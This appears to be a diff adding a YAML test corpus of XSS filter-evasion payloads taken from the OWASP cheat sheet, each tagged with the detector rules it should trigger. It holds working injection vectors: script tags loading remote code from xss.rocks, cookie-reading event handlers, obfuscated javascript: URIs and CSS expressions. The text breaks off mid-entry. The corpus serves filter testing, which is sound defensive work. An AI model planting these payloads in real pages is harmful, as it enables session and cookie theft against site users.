@@ -1,0 +1,1696 @@
+meta:
+  version: 1
+  title: OWASP XSS Filter Evasion Cheat Sheet 语料库
+  source:
+    name: OWASP XSS Filter Evasion Cheat Sheet
+    url: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+    raw_md: https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md
+  generated_by: generate.py
+  generated_at: '2026-09-05T11:52:03+00:00'
+  count: 148
+categories:
+  tag: 危险标签（本身危险，不需属性）
+  event: 事件处理器属性 on*
+  uri: 危险 URI（javascript:/vbscript:/data:）
+  attr: 危险 URI 属性（background/dynsrc/lowsrc/...）
+  css: CSS 注入（expression/@import/url()/-moz-binding）
+  enc: 编码混淆（实体/URL/空白/字符转义，解码后归入上述类）
+  server: 服务器端注入（SSI/PHP，引擎范围外，参考）
+rules:
+  script_tag:
+    status: impl
+    desc: <script>
+  dangerous_tag:
+    status: impl
+    desc: <iframe>/<object>/<embed>/<frame>/<svg>/<math>/<meta>
+  event_handler:
+    status: impl
+    desc: on* 事件属性
+  js_uri:
+    status: impl
+    desc: 'javascript:/vbscript:'
+  entity_lt:
+    status: impl
+    desc: '&#60;/&#x3c;/&lt;'
+  TODO_dangerous_tag:
+    status: todo
+    desc: 扩充 dangerous_tag：link/base/style
+  TODO_js_uri:
+    status: todo
+    desc: '扩充 js_uri：data:'
+  TODO_css:
+    status: todo
+    desc: 新增 CSS 规则
+  TODO_attr_uri:
+    status: todo
+    desc: 危险属性 URI 检测
+  TODO_protocol:
+    status: todo
+    desc: 协议解析绕过 //host
+  TODO_js:
+    status: todo
+    desc: JS 上下文注入/混淆（alert 函数名绕过等）
+  TODO_tokenizer:
+    status: todo
+    desc: 词法改进：前导闭合/注释/XML/反引号干扰
+  TODO_unknown:
+    status: todo
+    desc: 未归类
+tests:
+- id: basic-xss-test-without-filter-evasion
+  category: tag
+  raw: <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+  decoded: <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+  rules:
+  - script_tag
+  source: Basic XSS Test Without Filter Evasion
+  section: Tests
+  lang: html
+- id: xss-locator-polyglot
+  category: enc
+  raw: 'javascript:/*--></title></style></textarea></script></xmp>
+
+    <svg/onload=''+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//''>'
+  decoded: 'javascript:/*--></title></style></textarea></script></xmp>
+
+    <svg/onload=''+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//''>'
+  rules:
+  - dangerous_tag
+  - event_handler
+  - js_uri
+  source: XSS Locator (Polyglot)
+  section: Tests
+  lang: js
+- id: malformed-a-tags
+  category: event
+  raw: \<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+  decoded: \<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+  rules:
+  - event_handler
+  source: Malformed A Tags
+  section: Tests
+  lang: js
+- id: malformed-a-tags-2
+  category: event
+  raw: \<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+  decoded: \<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+  rules:
+  - event_handler
+  source: Malformed A Tags
+  section: Tests
+  lang: js
+- id: malformed-img-tags
+  category: tag
+  raw: <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+  decoded: <IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+  rules:
+  - TODO_tokenizer
+  source: Malformed IMG Tags
+  section: Tests
+  lang: html
+- id: fromcharcode
+  category: uri
+  raw: <a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+  decoded: <a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
+  rules:
+  - js_uri
+  source: fromCharCode
+  section: Tests
+  lang: html
+- id: default-src-tag-to-get-past-filters-that-check-src-domain
+  category: event
+  raw: <IMG SRC=# onmouseover="alert('xxs')">
+  decoded: <IMG SRC=# onmouseover="alert('xxs')">
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: Default SRC Tag to Get Past Filters that Check SRC Domain
+  section: Tests
+  lang: html
+- id: default-src-tag-by-leaving-it-empty
+  category: event
+  raw: <IMG SRC= onmouseover="alert('xxs')">
+  decoded: <IMG SRC= onmouseover="alert('xxs')">
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: Default SRC Tag by Leaving it Empty
+  section: Tests
+  lang: html
+- id: default-src-tag-by-leaving-it-out-entirely
+  category: event
+  raw: <IMG onmouseover="alert('xxs')">
+  decoded: <IMG onmouseover="alert('xxs')">
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: Default SRC Tag by Leaving it out Entirely
+  section: Tests
+  lang: html
+- id: on-error-alert
+  category: event
+  raw: <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+  decoded: <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: On Error Alert
+  section: Tests
+  lang: html
+- id: img-onerror-and-javascript-alert-encode
+  category: event
+  raw: <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+  decoded: <img src=x onerror="javascript:alert('XSS')">
+  rules:
+  - event_handler
+  - js_uri
+  - TODO_dangerous_tag
+  source: IMG onerror and JavaScript Alert Encode
+  section: Tests
+  lang: html
+- id: decimal-html-character-references
+  category: enc
+  raw: ' <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click
+    Me!</a>'
+  decoded: ' <a href="javascript:alert(''XSS'')">Click Me!</a>'
+  rules:
+  - js_uri
+  source: Decimal HTML Character References
+  section: Tests
+  lang: html
+- id: decimal-html-character-references-without-trailing-semicolons
+  category: enc
+  raw: <a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click
+    Me</a>
+  decoded: <a href="javascript:alert('XSS')">Click Me</a>
+  rules:
+  - js_uri
+  source: Decimal HTML Character References Without Trailing Semicolons
+  section: Tests
+  lang: html
+- id: hexadecimal-html-character-references-without-trailing-semicolons
+  category: enc
+  raw: <a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click
+    Me</a>
+  decoded: <a href="javascript:alert('XSS')">Click Me</a>
+  rules:
+  - js_uri
+  source: Hexadecimal HTML Character References Without Trailing Semicolons
+  section: Tests
+  lang: html
+- id: embedded-tab
+  category: tag
+  raw: " <a href=\"jav\tascript:alert('XSS');\">Click Me</a>"
+  decoded: ' <a href="javascript:alert(''XSS'');">Click Me</a>'
+  rules:
+  - js_uri
+  source: Embedded Tab
+  section: Tests
+  lang: html
+- id: embedded-encoded-tab
+  category: enc
+  raw: ' <a href="jav&#x09;ascript:alert(''XSS'');">Click Me</a>'
+  decoded: ' <a href="javascript:alert(''XSS'');">Click Me</a>'
+  rules:
+  - js_uri
+  source: Embedded Encoded Tab
+  section: Tests
+  lang: html
+- id: embedded-newline-to-break-up-xss
+  category: enc
+  raw: <a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
+  decoded: <a href="javascript:alert('XSS');">Click Me</a>
+  rules:
+  - js_uri
+  source: Embedded Newline to Break Up XSS
+  section: Tests
+  lang: html
+- id: example-1-break-up-xss-attack-with-embedded-carriage-return
+  category: enc
+  raw: <a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
+  decoded: <a href="javascript:alert('XSS');">Click Me</a>
+  rules:
+  - js_uri
+  source: 'Example 1: Break Up XSS Attack with Embedded Carriage Return'
+  section: Tests
+  lang: html
+- id: example-2-break-up-javascript-directive-with-null
+  category: tag
+  raw: perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+  decoded: perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+  rules:
+  - TODO_dangerous_tag
+  source: 'Example 2: Break Up JavaScript Directive with Null'
+  section: Tests
+  lang: sh
+- id: example-3-spaces-and-meta-chars-before-the-javascript-in-images-for-xss
+  category: uri
+  raw: <a href=" &#14;  javascript:alert('XSS');">Click Me</a>
+  decoded: <a href="javascript:alert('XSS');">Click Me</a>
+  rules:
+  - js_uri
+  source: 'Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS'
+  section: Tests
+  lang: html
+- id: example-4-non-alpha-non-digit-xss
+  category: tag
+  raw: <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: 'Example 4: Non-alpha-non-digit XSS'
+  section: Tests
+  lang: html
+- id: example-4-non-alpha-non-digit-xss-2
+  category: tag
+  raw: <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+  decoded: <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+  rules:
+  - TODO_dangerous_tag
+  source: 'Example 4: Non-alpha-non-digit XSS'
+  section: Tests
+  lang: html
+- id: example-4-non-alpha-non-digit-xss-3
+  category: tag
+  raw: <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: 'Example 4: Non-alpha-non-digit XSS'
+  section: Tests
+  lang: html
+- id: extraneous-open-brackets
+  category: tag
+  raw: <<SCRIPT>alert("XSS");//\<</SCRIPT>
+  decoded: <<SCRIPT>alert("XSS");//\<</SCRIPT>
+  rules:
+  - script_tag
+  source: Extraneous Open Brackets
+  section: Tests
+  lang: html
+- id: no-closing-script-tags
+  category: tag
+  raw: <SCRIPT SRC=http://xss.rocks/xss.js?< B >
+  decoded: <SCRIPT SRC=http://xss.rocks/xss.js?< B >
+  rules:
+  - script_tag
+  source: No Closing Script Tags
+  section: Tests
+  lang: html
+- id: protocol-resolution-in-script-tags
+  category: tag
+  raw: <SCRIPT SRC=//xss.rocks/.j>
+  decoded: <SCRIPT SRC=//xss.rocks/.j>
+  rules:
+  - script_tag
+  - TODO_protocol
+  source: Protocol Resolution in Script Tags
+  section: Tests
+  lang: html
+- id: half-open-html-javascript-xss-vector
+  category: uri
+  raw: <IMG SRC="`<javascript:alert>`('XSS')"
+  decoded: <IMG SRC="`<javascript:alert>`('XSS')"
+  rules:
+  - TODO_tokenizer
+  source: Half Open HTML/JavaScript XSS Vector
+  section: Tests
+  lang: html
+- id: escaping-javascript-escapes
+  category: enc
+  raw: \";alert('XSS');//
+  decoded: \";alert('XSS');//
+  rules:
+  - TODO_js
+  source: Escaping JavaScript Escapes
+  section: Tests
+  lang: js
+- id: escaping-javascript-escapes-2
+  category: tag
+  raw: </script><script>alert('XSS');</script>
+  decoded: </script><script>alert('XSS');</script>
+  rules:
+  - script_tag
+  source: Escaping JavaScript Escapes
+  section: Tests
+  lang: js
+- id: end-title-tag
+  category: tag
+  raw: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
+  decoded: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
+  rules:
+  - script_tag
+  source: End Title Tag
+  section: Tests
+  lang: html
+- id: input-image
+  category: uri
+  raw: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+  decoded: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: INPUT Image
+  section: Tests
+  lang: html
+- id: body-image
+  category: attr
+  raw: <BODY BACKGROUND="javascript:alert('XSS')">
+  decoded: <BODY BACKGROUND="javascript:alert('XSS')">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: BODY Image
+  section: Tests
+  lang: html
+- id: img-dynsrc
+  category: attr
+  raw: <IMG DYNSRC="javascript:alert('XSS')">
+  decoded: <IMG DYNSRC="javascript:alert('XSS')">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: IMG Dynsrc
+  section: Tests
+  lang: html
+- id: img-lowsrc
+  category: attr
+  raw: <IMG LOWSRC="javascript:alert('XSS')">
+  decoded: <IMG LOWSRC="javascript:alert('XSS')">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: IMG Lowsrc
+  section: Tests
+  lang: html
+- id: list-style-image
+  category: css
+  raw: '<STYLE>li {list-style-image: url("javascript:alert(''XSS'')");}</STYLE><UL><LI>XSS</br>'
+  decoded: '<STYLE>li {list-style-image: url("javascript:alert(''XSS'')");}</STYLE><UL><LI>XSS</br>'
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: List-style-image
+  section: Tests
+  lang: html
+- id: vbscript-in-an-image
+  category: uri
+  raw: <IMG SRC='vbscript:msgbox("XSS")'>
+  decoded: <IMG SRC='vbscript:msgbox("XSS")'>
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: VBscript in an Image
+  section: Tests
+  lang: html
+- id: svg-object-tag
+  category: event
+  raw: <svg/onload=alert('XSS')>
+  decoded: <svg/onload=alert('XSS')>
+  rules:
+  - dangerous_tag
+  - event_handler
+  source: SVG Object Tag
+  section: Tests
+  lang: js
+- id: ecmascript-6
+  category: enc
+  raw: Set.constructor`alert\x28document.domain\x29
+  decoded: Set.constructor`alert(document.domain)
+  rules:
+  - TODO_js
+  source: ECMAScript 6
+  section: Tests
+  lang: js
+- id: body-tag
+  category: event
+  raw: <BODY ONLOAD=alert('XSS')>
+  decoded: <BODY ONLOAD=alert('XSS')>
+  rules:
+  - event_handler
+  - TODO_dangerous_tag
+  source: BODY Tag
+  section: Tests
+  lang: html
+- id: bgsound
+  category: uri
+  raw: <BGSOUND SRC="javascript:alert('XSS');">
+  decoded: <BGSOUND SRC="javascript:alert('XSS');">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: BGSOUND
+  section: Tests
+  lang: js
+- id: javascript-includes
+  category: tag
+  raw: <BR SIZE="&{alert('XSS')}">
+  decoded: <BR SIZE="&{alert('XSS')}">
+  rules:
+  - TODO_dangerous_tag
+  source: '& JavaScript includes'
+  section: Tests
+  lang: html
+- id: style-sheet
+  category: uri
+  raw: <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+  decoded: <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: STYLE sheet
+  section: Tests
+  lang: html
+- id: remote-style-sheet
+  category: tag
+  raw: <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+  decoded: <LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+  rules:
+  - TODO_dangerous_tag
+  source: Remote style sheet
+  section: Tests
+  lang: html
+- id: remote-style-sheet-part-2
+  category: css
+  raw: <STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+  decoded: <STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: Remote style sheet part 2
+  section: Tests
+  lang: html
+- id: remote-style-sheet-part-3
+  category: css
+  raw: <STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+  decoded: <STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: Remote style sheet part 3
+  section: Tests
+  lang: html
+- id: style-tags-that-breaks-up-javascript-for-xss
+  category: tag
+  raw: <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+  decoded: <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+  rules:
+  - TODO_dangerous_tag
+  source: STYLE Tags that Breaks Up JavaScript for XSS
+  section: Tests
+  lang: html
+- id: style-attribute-that-breaks-up-an-expression
+  category: tag
+  raw: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+  decoded: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+  rules:
+  - TODO_dangerous_tag
+  source: STYLE Attribute that Breaks Up an Expression
+  section: Tests
+  lang: html
+- id: img-style-with-expressions
+  category: css
+  raw: 'exp/*<A STYLE=''no\xss:noxss("*//*");
+
+    xss:ex/*XSS*//*/*/pression(alert("XSS"))''>'
+  decoded: 'exp/*<A STYLE=''no\xss:noxss("*//*");
+
+    xss:ex/*XSS*//*/*/pression(alert("XSS"))''>'
+  rules:
+  - TODO_css
+  source: IMG STYLE with Expressions
+  section: Tests
+  lang: html
+- id: style-tag-using-background-image
+  category: css
+  raw: <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+  decoded: <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: STYLE Tag using Background-image
+  section: Tests
+  lang: html
+- id: style-tag-using-background
+  category: css
+  raw: '<STYLE type="text/css">BODY{background:url("javascript:alert(''XSS'')")}</STYLE>
+
+    <STYLE type="text/css">BODY{background:url("<javascript:alert>(''XSS'')")}</STYLE>'
+  decoded: '<STYLE type="text/css">BODY{background:url("javascript:alert(''XSS'')")}</STYLE>
+
+    <STYLE type="text/css">BODY{background:url("<javascript:alert>(''XSS'')")}</STYLE>'
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: STYLE Tag using Background
+  section: Tests
+  lang: html
+- id: anonymous-html-with-style-attribute
+  category: css
+  raw: <XSS STYLE="xss:expression(alert('XSS'))">
+  decoded: <XSS STYLE="xss:expression(alert('XSS'))">
+  rules:
+  - TODO_css
+  source: Anonymous HTML with STYLE Attribute
+  section: Tests
+  lang: html
+- id: local-htc-file
+  category: css
+  raw: '<XSS STYLE="behavior: url(xss.htc);">'
+  decoded: '<XSS STYLE="behavior: url(xss.htc);">'
+  rules:
+  - TODO_css
+  source: Local htc File
+  section: Tests
+  lang: html
+- id: us-ascii-encoding
+  category: enc
+  raw: ¼script¾alert(¢XSS¢)¼/script¾
+  decoded: <script>alert("XSS")</script>
+  rules:
+  - script_tag
+  source: US-ASCII Encoding
+  section: Tests
+  lang: js
+- id: meta
+  category: uri
+  raw: <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+  decoded: <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+  rules:
+  - dangerous_tag
+  - TODO_js_uri
+  source: META
+  section: Tests
+  lang: html
+- id: meta-using-data
+  category: uri
+  raw: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+  decoded: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+  rules:
+  - dangerous_tag
+  - TODO_js_uri
+  source: META using Data
+  section: Tests
+  lang: html
+- id: meta-with-additional-url-parameter
+  category: uri
+  raw: <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+  decoded: <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+  rules:
+  - dangerous_tag
+  - TODO_js_uri
+  source: META with Additional URL Parameter
+  section: Tests
+  lang: html
+- id: iframe
+  category: uri
+  raw: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+  decoded: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+  rules:
+  - dangerous_tag
+  - js_uri
+  source: IFRAME
+  section: Tests
+  lang: html
+- id: iframe-event-based
+  category: event
+  raw: <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+  decoded: <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+  rules:
+  - dangerous_tag
+  - event_handler
+  source: IFRAME Event Based
+  section: Tests
+  lang: html
+- id: frame
+  category: uri
+  raw: <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+  decoded: <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+  rules:
+  - dangerous_tag
+  - js_uri
+  source: FRAME
+  section: Tests
+  lang: html
+- id: table
+  category: attr
+  raw: <TABLE BACKGROUND="javascript:alert('XSS')">
+  decoded: <TABLE BACKGROUND="javascript:alert('XSS')">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: TABLE
+  section: Tests
+  lang: html
+- id: td
+  category: attr
+  raw: <TABLE><TD BACKGROUND="javascript:alert('XSS')">
+  decoded: <TABLE><TD BACKGROUND="javascript:alert('XSS')">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: TD
+  section: Tests
+  lang: html
+- id: div-background-image
+  category: css
+  raw: '<DIV STYLE="background-image: url(javascript:alert(''XSS''))">'
+  decoded: '<DIV STYLE="background-image: url(javascript:alert(''XSS''))">'
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: DIV Background-image
+  section: Tests
+  lang: html
+- id: div-background-image-with-unicode-xss-exploit
+  category: css
+  raw: <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+  decoded: <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+  rules:
+  - TODO_dangerous_tag
+  source: DIV Background-image with Unicode XSS Exploit
+  section: Tests
+  lang: html
+- id: div-background-image-plus-extra-characters
+  category: css
+  raw: "<DIV STYLE=\"background-image: url(\x01javascript:alert('XSS'))\">"
+  decoded: '<DIV STYLE="background-image: url(javascript:alert(''XSS''))">'
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: DIV Background-image Plus Extra Characters
+  section: Tests
+  lang: html
+- id: div-expression
+  category: css
+  raw: '<DIV STYLE="width: expression(alert(''XSS''));">'
+  decoded: '<DIV STYLE="width: expression(alert(''XSS''));">'
+  rules:
+  - TODO_css
+  - TODO_dangerous_tag
+  source: DIV Expression
+  section: Tests
+  lang: html
+- id: downlevel-hidden-block
+  category: tag
+  raw: '<!--[if gte IE 4]>
+
+    <SCRIPT>alert(''XSS'');</SCRIPT>
+
+    <![endif]-->'
+  decoded: '<!--[if gte IE 4]>
+
+    <SCRIPT>alert(''XSS'');</SCRIPT>
+
+    <![endif]-->'
+  rules:
+  - TODO_tokenizer
+  source: Downlevel-Hidden Block
+  section: Tests
+  lang: js
+- id: base-tag
+  category: uri
+  raw: <BASE HREF="javascript:alert('XSS');//">
+  decoded: <BASE HREF="javascript:alert('XSS');//">
+  rules:
+  - js_uri
+  - TODO_dangerous_tag
+  source: BASE Tag
+  section: Tests
+  lang: html
+- id: object-tag
+  category: tag
+  raw: <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+  decoded: <OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+  rules:
+  - dangerous_tag
+  source: OBJECT Tag
+  section: Tests
+  lang: html
+- id: embed-svg-which-contains-xss-vector
+  category: uri
+  raw: <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv
+    MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw
+    IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="
+    type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+  decoded: <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv
+    MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw
+    IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="
+    type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+  rules:
+  - dangerous_tag
+  - TODO_js_uri
+  source: EMBED SVG Which Contains XSS Vector
+  section: Tests
+  lang: html
+- id: xml-data-island-with-cdata-obfuscation
+  category: tag
+  raw: '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(''XSS'')"></B></I></XML>
+
+    <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'
+  decoded: '<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(''XSS'')"></B></I></XML>
+
+    <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>'
+  rules:
+  - TODO_dangerous_tag
+  source: XML Data Island with CDATA Obfuscation
+  section: Tests
+  lang: html
+- id: locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island
+  category: tag
+  raw: '<XML SRC="xsstest.xml" ID=I></XML>
+
+    <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>'
+  decoded: '<XML SRC="xsstest.xml" ID=I></XML>
+
+    <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>'
+  rules:
+  - TODO_dangerous_tag
+  source: Locally hosted XML with embedded JavaScript that is generated using an XML data island
+  section: Tests
+  lang: html
+- id: html-time-in-xml
+  category: tag
+  raw: '<HTML><BODY>
+
+    <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+
+    <?import namespace="t" implementation="#default#time2">
+
+    <t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
+
+    </BODY></HTML>'
+  decoded: '<HTML><BODY>
+
+    <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+
+    <?import namespace="t" implementation="#default#time2">
+
+    <t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
+
+    </BODY></HTML>'
+  rules:
+  - TODO_tokenizer
+  source: HTML+TIME in XML
+  section: Tests
+  lang: html
+- id: assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js
+  category: tag
+  raw: <SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+  decoded: <SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+  rules:
+  - script_tag
+  source: Assuming you can only fit in a few characters and it filters against `.js`
+  section: Tests
+  lang: html
+- id: ssi-server-side-includes
+  category: server
+  raw: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
+  decoded: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
+  rules: []
+  source: SSI (Server Side Includes)
+  section: Tests
+  lang: js
+- id: php
+  category: server
+  raw: '<? echo(''<SCR)'';
+
+    echo(''IPT>alert("XSS")</SCRIPT>''); ?>'
+  decoded: '<? echo(''<SCR)'';
+
+    echo(''IPT>alert("XSS")</SCRIPT>''); ?>'
+  rules: []
+  source: PHP
+  section: Tests
+  lang: php
+- id: img-embedded-commands
+  category: tag
+  raw: <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+  decoded: <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+  rules:
+  - TODO_dangerous_tag
+  source: IMG Embedded Commands
+  section: Tests
+  lang: html
+- id: img-embedded-commands-part-ii
+  category: server
+  raw: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+  decoded: Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
+  rules: []
+  source: IMG Embedded Commands part II
+  section: Tests
+  lang: log
+- id: cookie-manipulation
+  category: tag
+  raw: <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+  decoded: <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+  rules:
+  - script_tag
+  - dangerous_tag
+  source: Cookie Manipulation
+  section: Tests
+  lang: html
+- id: xss-using-html-quote-encapsulation
+  category: tag
+  raw: <SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  decoded: <SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+  rules:
+  - script_tag
+  source: XSS Using HTML Quote Encapsulation
+  section: Tests
+  lang: html
+- id: xss-using-html-quote-encapsulation-2
+  category: tag
